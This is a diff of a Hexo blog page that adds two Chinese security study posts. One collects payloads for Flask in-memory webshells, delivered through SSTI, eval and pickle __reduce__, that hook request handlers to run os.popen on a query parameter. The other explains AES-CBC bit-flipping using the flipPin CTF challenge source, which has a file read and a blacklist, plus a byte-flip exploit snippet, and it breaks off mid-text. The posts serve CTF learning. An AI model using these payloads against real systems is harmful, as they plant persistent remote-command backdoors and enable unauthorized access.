@@ -20,12 +20,12 @@
     var CONFIG = {"hostname":"chensonghi.github.io.","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","Sidebar Display (only for Muse | Mist), available values":["always  expand for all pages automatically."],"display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
   </script>
 
-  <meta name="description" content="不是看到希望才坚持，而是坚持了才能看到希望">
+  <meta name="description" content="Record my study life">
 <meta property="og:type" content="website">
-<meta property="og:title" content="星河风">
+<meta property="og:title" content="chleynx&#39;s blog">
 <meta property="og:url" content="https://chensonghi.github.io./index.html">
-<meta property="og:site_name" content="星河风">
-<meta property="og:description" content="不是看到希望才坚持，而是坚持了才能看到希望">
+<meta property="og:site_name" content="chleynx&#39;s blog">
+<meta property="og:description" content="Record my study life">
 <meta property="og:locale" content="zh_CN">
 <meta property="article:author" content="chleynx">
 <meta name="twitter:card" content="summary">
@@ -43,7 +43,7 @@
   };
 </script>
 
-  <title>星河风</title>
+  <title>chleynx's blog</title>
   
 
 
@@ -94,7 +94,7 @@
 
     <a href="/" class="brand" rel="start">
       <span class="logo-line-before"><i></i></span>
-      <h1 class="site-title">星河风</h1>
+      <h1 class="site-title">chleynx's blog</h1>
       <span class="logo-line-after"><i></i></span>
     </a>
   </div>
@@ -167,16 +167,444 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://chensonghi.github.io./2024/07/20/Memory-Horse-in-Flask/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/ch.jpg">
+      <meta itemprop="name" content="chleynx">
+      <meta itemprop="description" content="Record my study life">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="chleynx's blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2024/07/20/Memory-Horse-in-Flask/" class="post-title-link" itemprop="url">flask下的内存马</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2024-07-20 09:22:51" itemprop="dateCreated datePublished" datetime="2024-07-20T09:22:51+08:00">2024-07-20</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2024-08-10 01:38:13" itemprop="dateModified" datetime="2024-08-10T01:38:13+08:00">2024-08-10</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Summary/" itemprop="url" rel="index"><span itemprop="name">Summary</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="FLASK下python内存马"><a href="#FLASK下python内存马" class="headerlink" title="FLASK下python内存马"></a>FLASK下python内存马</h1><p><a target="_blank" rel="noopener" href="https://github.com/bfengj/CTF/blob/main/Web/python/[Python]Flask%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0.md">Python]Flask内存马学习.md at main · bfengj&#x2F;CTF (github.com)</a></p>
+<p><a target="_blank" rel="noopener" href="https://longlone.top/%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/flask%E4%B8%8D%E5%87%BA%E7%BD%91%E5%9B%9E%E6%98%BE%E6%96%B9%E5%BC%8F/">flask不出网回显方式 - Longlone’s Blog</a></p>
+<h2 id="初始"><a href="#初始" class="headerlink" title="初始"></a>初始</h2><p>在一个月黑风高的夜晚，看见一个从未见过的函数add_url_rule，然后经过亿系列的查询发现是flask的内存马常用的东西</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">add_url_rule()</span><br><span class="line">可以添加一个自定义路由，并且可以自定义匿名函数，访问这个路由就可以调用这个匿名函数</span><br></pre></td></tr></table></figure>
+
+<p>这里有payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sys.modules[&#x27;__main__&#x27;].__dict__[&#x27;app&#x27;].add_url_rule(&#x27;/shell&#x27;,&#x27;shell&#x27;,lambda :__import__(&#x27;os&#x27;).popen(&#x27;dir&#x27;).read())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ssti:</span><br><span class="line">&#123;&#123;url_for.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](\&quot;app.add_url_rule(&#x27;/shell&#x27;, &#x27;myshell&#x27;, lambda :__import__(&#x27;os&#x27;).popen(_request_ctx_stack.top.request.args.get(&#x27;cmd&#x27;)).read())\&quot;,&#123;&#x27;_request_ctx_stack&#x27;:url_for.__globals__[&#x27;_request_ctx_stack&#x27;],&#x27;app&#x27;:url_for.__globals__[&#x27;current_app&#x27;]&#125;)&#125;&#125;&quot;</span><br></pre></td></tr></table></figure>
+
+<p>但是！这是老版本的，关闭debug模式会调用到check函数，然后会导致报错</p>
+<p>然而在新版本当中，很多地方都存在check函数，so，G</p>
+<p>然后看见有师傅提供了方法</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">通过@app.before_request @app.after_request来打</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2024/07/20/Memory-Horse-in-Flask/image-20240515013354373.png" alt="image-20240515013354373"></p>
+<p>就是在请求之前做一些操作<br>看看这个装饰器</p>
+<p><img src="/2024/07/20/Memory-Horse-in-Flask/image-20240515013857705.png" alt="image-20240515013857705"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">before_request_funcs.setdefault(None, []).append(f)</span><br><span class="line">这个f就是我们传入的函数</span><br><span class="line">so</span><br><span class="line">lambda :__import__(&#x27;os&#x27;).popen(&#x27;whoami&#x27;).read()    这🐎不就又行了！</span><br><span class="line"></span><br><span class="line">payload</span><br><span class="line">eval(&quot;__import__(&#x27;sys&#x27;).modules[&#x27;__main__&#x27;].__dict__[&#x27;app&#x27;].before_request_funcs.setdefault(None,[]).append(lambda :__import__(&#x27;os&#x27;).popen(&#x27;dir&#x27;).read())&quot;)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2024/07/20/Memory-Horse-in-Flask/image-20240515013404680.png" alt="image-20240515013404680"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">eval(&quot;app.after_request_funcs.setdefault(None, []).append(lambda resp: CmdResp if request.args.get(&#x27;cmd&#x27;) and exec(\&quot;global CmdResp;CmdResp=__import__(\&#x27;flask\&#x27;).make_response(__import__(\&#x27;os\&#x27;).popen(request.args.get(\&#x27;cmd\&#x27;)).read())\&quot;)==None else resp)&quot;)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2024/07/20/Memory-Horse-in-Flask/image-20240515015200446.png" alt="image-20240515015200446"></p>
+<p>发现大佬通过其它hook也能打入</p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/gxngxngxn/p/18181936">新版FLASK下python内存马的研究 - gxngxngxn - 博客园 (cnblogs.com)</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">errorhandler:   -----!!!控制404界面</span><br><span class="line">exec(&quot;global exc_class;global code;exc_class, code = app._get_exc_class_and_code(404);app.error_handler_spec[None][code][exc_class] = lambda a:__import__(&#x27;os&#x27;).popen(request.args.get(&#x27;gxngxngxn&#x27;)).read()&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">teardown_request</span><br><span class="line">跟after_request差不多</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h3 id="pickle利用下的payload"><a href="#pickle利用下的payload" class="headerlink" title="pickle利用下的payload"></a><strong>pickle</strong>利用下的payload</h3><h4 id="before-request"><a href="#before-request" class="headerlink" title="before_request:"></a>before_request:</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line">import pickle</span><br><span class="line">import base64</span><br><span class="line">class A():</span><br><span class="line">    def __reduce__(self):</span><br><span class="line">        return (eval,(&quot;__import__(\&quot;sys\&quot;).modules[&#x27;__main__&#x27;].__dict__[&#x27;app&#x27;].before_request_funcs.setdefault(None, []).append(lambda :__import__(&#x27;os&#x27;).popen(request.args.get(&#x27;gxngxngxn&#x27;)).read())&quot;,))</span><br><span class="line"></span><br><span class="line">a = A()</span><br><span class="line">b = pickle.dumps(a)</span><br><span class="line">print(base64.b64encode(b))</span><br></pre></td></tr></table></figure>
+
+<h4 id="after-request"><a href="#after-request" class="headerlink" title="after_request:"></a>after_request:</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line">import pickle</span><br><span class="line">import base64</span><br><span class="line">class A():</span><br><span class="line">    def __reduce__(self):</span><br><span class="line">        return (eval,(&quot;__import__(&#x27;sys&#x27;).modules[&#x27;__main__&#x27;].__dict__[&#x27;app&#x27;].after_request_funcs.setdefault(None, []).append(lambda resp: CmdResp if request.args.get(&#x27;gxngxngxn&#x27;) and exec(\&quot;global CmdResp;CmdResp=__import__(\&#x27;flask\&#x27;).make_response(__import__(\&#x27;os\&#x27;).popen(request.args.get(\&#x27;gxngxngxn\&#x27;)).read())\&quot;)==None else resp)&quot;,))</span><br><span class="line"></span><br><span class="line">a = A()</span><br><span class="line">b = pickle.dumps(a)</span><br><span class="line">print(base64.b64encode(b))</span><br></pre></td></tr></table></figure>
+
+<h4 id="errorhandler"><a href="#errorhandler" class="headerlink" title="errorhandler:"></a>errorhandler:</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line">import pickle</span><br><span class="line">import base64</span><br><span class="line">class A():</span><br><span class="line">    def __reduce__(self):</span><br><span class="line">        return (exec,(&quot;global exc_class;global code;exc_class, code = app._get_exc_class_and_code(404);app.error_handler_spec[None][code][exc_class] = lambda a:__import__(&#x27;os&#x27;).popen(request.args.get(&#x27;gxngxngxn&#x27;)).read()&quot;,))</span><br><span class="line"></span><br><span class="line">a = A()</span><br><span class="line">b = pickle.dumps(a)</span><br><span class="line">print(base64.b64encode(b))</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>ssti</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;url_for.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](\&quot;app.add_url_rule(&#x27;/shell&#x27;, &#x27;shell&#x27;, lambda :__import__(&#x27;os&#x27;).popen(_request_ctx_stack.top.request.args.get(&#x27;cmd&#x27;)).read())\&quot;,&#123;&#x27;_request_ctx_stack&#x27;:url_for.__globals__[&#x27;_request_ctx_stack&#x27;],&#x27;app&#x27;:url_for.__globals__[&#x27;current_app&#x27;]&#125;)&#125;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#123;&#123;url_for.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](\&quot;app.before_request_funcs.setdefault(None, []).append(lambda :__import__(&#x27;os&#x27;).popen(request.args.get(&#x27;gxngxngxn&#x27;)).read())\&quot;,&#123;&#x27;_request_ctx_stack&#x27;:url_for.__globals__[&#x27;_request_ctx_stack&#x27;],&#x27;app&#x27;:url_for.__globals__[&#x27;current_app&#x27;]&#125;)&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+
+    
+    
+    
+	
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://chensonghi.github.io./2024/06/25/AES-CBC%E5%8F%8D%E8%BD%AC/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/ch.jpg">
+      <meta itemprop="name" content="chleynx">
+      <meta itemprop="description" content="Record my study life">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="chleynx's blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2024/06/25/AES-CBC%E5%8F%8D%E8%BD%AC/" class="post-title-link" itemprop="url">AES-CBC反转攻击</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2024-06-25 00:22:51" itemprop="dateCreated datePublished" datetime="2024-06-25T00:22:51+08:00">2024-06-25</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2024-08-10 01:36:07" itemprop="dateModified" datetime="2024-08-10T01:36:07+08:00">2024-08-10</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Summary/" itemprop="url" rel="index"><span itemprop="name">Summary</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="AES-CBC反转攻击"><a href="#AES-CBC反转攻击" class="headerlink" title="AES-CBC反转攻击"></a>AES-CBC反转攻击</h1><p>在一些特定情况下才能使用</p>
+<p><img src="/2024/06/25/AES-CBC%E5%8F%8D%E8%BD%AC/image-20240514114515342.png" alt="image-20240514114515342"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Plaintext：明文</span><br><span class="line">IV：初始化向量</span><br><span class="line">Ciphertext：密文</span><br><span class="line">key：密钥</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">加密步骤：</span><br><span class="line">1、先将明文分组，十六个字符一组(常见)，不足16个的特殊字符进行填充</span><br><span class="line">2、生成IV和key</span><br><span class="line">3、将第一组Plaintext与IV异或</span><br><span class="line">4、用密钥对第三步的密文进行加密</span><br><span class="line">5、将第4步的密文与第二组明文进行异或</span><br><span class="line">6、再次用密钥对第5步的密文进行加密</span><br><span class="line">7、重复第4，5，6步直到处理完最后一组数据</span><br><span class="line">8、然后IV和最后一次的密文拼接，从而获得最后的加密结果</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">解密步骤：</span><br><span class="line">1、从密文中将IV和密文数据分离</span><br><span class="line">2、然后使用key对密文数据进行解密，再与IV异或</span><br><span class="line">3、再对第2步的结果使用key解密，再与2中的密文异或</span><br><span class="line">4、重复2、3得到Plaintext</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">异或有一个特性：</span><br><span class="line">任意值与自己本身做异或运算的结果都是0，任意值与0做异或运算的结果都是自己。本身a^b=c，a^a则为空，但是a^a^任意字母=任意字母。</span><br></pre></td></tr></table></figure>
+
+<p>字节反转：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">在CBC解密中，核心是控制上一个密文来对当前明文改变。A是第一组的密文，B是第二组被解密的密文（未异或），C是明文。C=A^B。那么B=C^A，且A^B^C=0。如果我们更改A，A为我们可控的密文，C=A^B,如果我们使A=B^X，B=C^A,所以A=C^A^X,C=C^A^X^B=B^X^B=X。这里X是我们需要的任意字符，这便是CBC字节反转攻击的核心，这样一来C的明文就完全可控了。</span><br></pre></td></tr></table></figure>
+
+<p>IV已知：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">当我们破坏掉密文的第一组时，同样明文的第一组在解密的时候就并不是原来的明文了（可能会导致解密失败），这个时候我们需要修复初始向量IV，给它一个新的值。</span><br><span class="line">newPlaintext,Plaintext</span><br><span class="line">Ciphertext,newCiphertext   ----这是已经经过key解密的密文</span><br><span class="line">newIV,IV</span><br><span class="line">目的就是要使得：Plaintext=newIV^newCiphertext</span><br><span class="line"></span><br><span class="line">过程：</span><br><span class="line">IV^newPlaintext=newCiphertext</span><br><span class="line">newIV^Plaintext=newCiphertext</span><br><span class="line">所以：newIV=IV^newPlaintext^Plaintext</span><br><span class="line">这样我们就能够对明文进行构造了</span><br></pre></td></tr></table></figure>
+
+<p>给两个例题:</p>
+<h3 id="flipPin（H-NCTF2024）"><a href="#flipPin（H-NCTF2024）" class="headerlink" title="flipPin（H&amp;NCTF2024）"></a>flipPin（H&amp;NCTF2024）</h3><p>源码</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, abort</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Random <span class="keyword">import</span> get_random_bytes</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad, unpad</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, Response</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64encode, b64decode</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">default_session = <span class="string">&#x27;&#123;&quot;admin&quot;: 0, &quot;username&quot;: &quot;user1&quot;&#125;&#x27;</span></span><br><span class="line">key = get_random_bytes(AES.block_size)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">session</span>):</span><br><span class="line">    iv = get_random_bytes(AES.block_size)</span><br><span class="line">    cipher = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">    <span class="keyword">return</span> b64encode(iv + cipher.encrypt(pad(session.encode(<span class="string">&#x27;utf-8&#x27;</span>), AES.block_size)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">session</span>):</span><br><span class="line">    raw = b64decode(session)</span><br><span class="line">    cipher = AES.new(key, AES.MODE_CBC, raw[:AES.block_size])</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        res = unpad(cipher.decrypt(raw[AES.block_size:]), AES.block_size).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> res</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(e)</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">filename_blacklist = &#123;</span><br><span class="line">    <span class="string">&#x27;self&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;cgroup&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;mountinfo&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;env&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;flag&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    session = request.cookies.get(<span class="string">&#x27;session&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> session <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        res = Response(</span><br><span class="line">            <span class="string">&quot;welcome to the FlipPIN server try request /hint to get the hint&quot;</span>)</span><br><span class="line">        res.set_cookie(<span class="string">&#x27;session&#x27;</span>, encrypt(default_session).decode())</span><br><span class="line">        <span class="keyword">return</span> res</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;have a fun&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/hint&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hint</span>():</span><br><span class="line">    res = Response(<span class="built_in">open</span>(__file__).read(), mimetype=<span class="string">&#x27;text/plain&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/read&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">file</span>():</span><br><span class="line"></span><br><span class="line">    session = request.cookies.get(<span class="string">&#x27;session&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> session <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        res = Response(<span class="string">&quot;you are not logged in&quot;</span>)</span><br><span class="line">        res.set_cookie(<span class="string">&#x27;session&#x27;</span>, encrypt(default_session))</span><br><span class="line">        <span class="keyword">return</span> res</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        plain_session = decrypt(session)</span><br><span class="line">        <span class="keyword">if</span> plain_session <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;don\&#x27;t hack me&#x27;</span></span><br><span class="line"></span><br><span class="line">        session_data = json.loads(plain_session)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> session_data[<span class="string">&#x27;admin&#x27;</span>] :</span><br><span class="line">            filename = request.args.get(<span class="string">&#x27;filename&#x27;</span>)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">any</span>(blacklist_str <span class="keyword">in</span> filename <span class="keyword">for</span> blacklist_str <span class="keyword">in</span> filename_blacklist):</span><br><span class="line">                abort(<span class="number">403</span>, description=<span class="string">&#x27;Access to this file is forbidden.&#x27;</span>)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                    <span class="keyword">return</span> f.read()</span><br><span class="line">            <span class="keyword">except</span> FileNotFoundError:</span><br><span class="line">                abort(<span class="number">404</span>, description=<span class="string">&#x27;File not found.&#x27;</span>)</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                abort(<span class="number">500</span>, description=<span class="string">f&#x27;An error occurred: <span class="subst">&#123;<span class="built_in">str</span>(e)&#125;</span>&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;You are not an administrator&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">9091</span>, debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>
+
+<p>简单审计一下代码，就是通过AES设置seesion然后通过文件任意读计算Pin码从而RCE</p>
+<p>第一步就是AES-CBC翻转攻击</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">&#123;&quot;admin&quot;: 0, &quot;us</span><br><span class="line">ername&quot;: &quot;user1&quot;</span><br><span class="line">&#125;</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line"># import base64</span><br><span class="line"># import urllib.parse</span><br><span class="line"></span><br><span class="line">cipher = base64.b64decode(&#x27;NGcMAGVYo/XqWTybD4TDonxbwAFSepn0xy0rzDrsIpylvnsjq5AobLr8uVhraQLNeTJMfe7usXGA6KDM+0uUIg==&#x27;.encode(&#x27;utf-8&#x27;))</span><br><span class="line">x = cipher[0:10]+bytes([ord(chr(cipher[10]))^ord(&#x27;1&#x27;)^ord(&#x27;0&#x27;)])+cipher[11:]</span><br><span class="line">x = base64.b64encode(x).decode(&#x27;utf-8&#x27;)</span><br><span class="line">print(x)</span><br><span class="line"></span><br><span class="line"># 